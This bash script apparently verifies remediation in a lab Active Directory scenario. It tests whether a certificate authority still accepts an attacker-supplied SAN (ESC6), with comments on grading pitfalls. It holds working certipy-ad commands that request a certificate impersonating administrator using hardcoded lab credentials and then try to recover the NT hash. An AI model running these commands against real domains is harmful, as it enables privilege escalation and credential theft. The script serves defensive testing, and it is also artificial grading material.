#!/usr/bin/env bash
# meta4/ad-vm/scenario-10/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce a SAN=administrator UPN cert via ESC6.

set -euo pipefail
cd "$(mktemp -d)"

# -target is REQUIRED: without it certipy sends the RPC enrollment request to
# -dc-ip, the DOMAIN CONTROLLER, which does not run CertSvc. Every run then died
# with ept_s_not_registered for ICertRequestD, on gates 1 and 2 alike, which
# read as "still vulnerable" both times. -dc-ip is for LDAP/Kerberos only.
REQ=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -target corp-ca01.corp.local \
    -dc-ip 10.20.30.5 \
    -template 'User' \
    -upn 'administrator@corp.local' 2>&1 || true)
echo "--- certipy req ---"
echo "$REQ"

# --- CA not serving RPC: HARNESS ERROR, never a verdict ---
#
# ept_s_not_registered means the endpoint mapper has no ICertRequestD
# (91AE6020-9E3C-11CF-8D7C-00AA00C091BE) to hand out: the CA's enrollment
# interface is not reachable from here, which says nothing about whether the
# EDITF_ATTRIBUTESUBJECTALTNAME2 SAN override is still accepted.
#
# This used to fall through to exit 1, which is wrong in BOTH directions.
# Observed on the 2026-07-26 gate run: gates 1 AND 2 both hit this, so the
# vulnerable baseline "failed for the right reason" and the remediated host
# "was still vulnerable" -- on identical output that only ever meant the CA
# was unreachable. Exit 2 keeps it out of the evidence pool entirely.
#
# Note this scenario's remediation RESTARTS CertSvc (clearing the flag needs
# it), so a genuine race is possible here -- which is precisely why it must be
# a harness error the runner can retry, not a graded result.
if echo "$REQ" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connection|Failed to get dynamic TCP endpoint'; then
    echo "[verify-poc-10] HARNESS ERROR: CA RPC enrollment interface not registered" >&2
    echo "[verify-poc-10] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
    exit 2
fi

# THE FINDING IS THE CA ACCEPTING AN ATTACKER-SUPPLIED SAN, NOT THE NT HASH.
#
# ESC6 is EDITF_ATTRIBUTESUBJECTALTNAME2: the CA honours a SAN supplied in the
# request, so any enrollee can obtain a certificate naming somebody else. That
# is the misconfiguration this scenario injects, and it is complete the moment
# the certificate is issued.
#
# Whether that certificate then AUTHENTICATES is a separate control. On a DC
# patched for KB5014754 the issued cert carries a SID security extension for
# the real requester, and Kerberos refuses it. Measured on the live lab, with
# ESC6 fully open:
#
#   [*] SAN UPN: 'administrator@corp.local'          <- the CA obeyed the SAN
#   [*] Security Extension SID: 'S-1-5-...-1105'     <- but it is alice's SID
#   [-] Object SID mismatch between certificate and user 'administrator'
#
# Requiring the NT hash therefore made the scenario UNWINNABLE on any current
# DC: the injected vulnerability was fully present and the check reported
# "no admin PFX and no recognised denial - INCONCLUSIVE". Same structural error
# as scenario-03, which graded on whether a password cracked rather than on
# whether the hash was obtainable.
#
# A certificate issued in another principal's name is the finding. Recovering
# the hash is corroboration and is still reported when it happens.
if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth \
        -pfx administrator.pfx \
        -dc-ip 10.20.30.5 2>&1 </dev/null || true)
    echo "--- certipy auth ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-10] ESC6 still open -- SAN override accepted, NT hash recovered" >&2
        exit 1
    fi
    if echo "$AUTH" | grep -qiE "SAN UPN: *'?administrator@corp.local|Object SID mismatch"; then
        echo "[verify-poc-10] ESC6 still open -- CA issued a cert naming administrator@corp.local" >&2
        echo "[verify-poc-10] (authentication was refused by strong certificate mapping, which is a" >&2
        echo "[verify-poc-10]  separate control; the SAN override itself was accepted)" >&2
        exit 1
    fi
    echo "[verify-poc-10] ESC6 still open -- a PFX was issued for an attacker-supplied SAN" >&2
    exit 1
fi

# --- SAN override IGNORED: the CA issued a cert for the REQUESTER ---
#
# This is what the remediation actually looks like, and it was unmatched.
# Clearing EDITF_ATTRIBUTESUBJECTALTNAME2 does not make the CA REFUSE the
# request -- it makes the CA disregard the attacker-supplied SAN and issue an
# ordinary certificate built from the requester's own identity. Observed on
# gate 2 of the 2026-07-27 run, with the fix correctly applied:
#
#   [*] Certificate object SID is 'S-1-5-21-...-1105'   (alice)
#   [*] Saving certificate and private key to 'alice.pfx'
#
# No administrator.pfx, no error, and no denial string anywhere -- so the check
# fell through to "no admin PFX and no recognised denial" and graded a working
# fix as a failure. A certificate naming the requester instead of the target is
# positive evidence that the override was refused.
if [ -f alice.pfx ] || echo "$REQ" | grep -qiE "Saving certificate and private key to 'alice\.pfx'|UPN 'alice@corp\.local'"; then
    echo "[verify-poc-10] CA ignored the supplied SAN and issued a cert for alice -- SAN override BLOCKED"
    exit 0
fi

if echo "$REQ" | grep -qiE 'access_denied|enrollment.*denied|invalid.*request|denied by policy'; then
    echo "[verify-poc-10] CA rejected SAN override -- BLOCKED"
    exit 0
fi
echo "[verify-poc-10] no admin PFX and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
echo "[verify-poc-10] an inconclusive probe is not evidence that the SAN override was blocked" >&2
exit 1
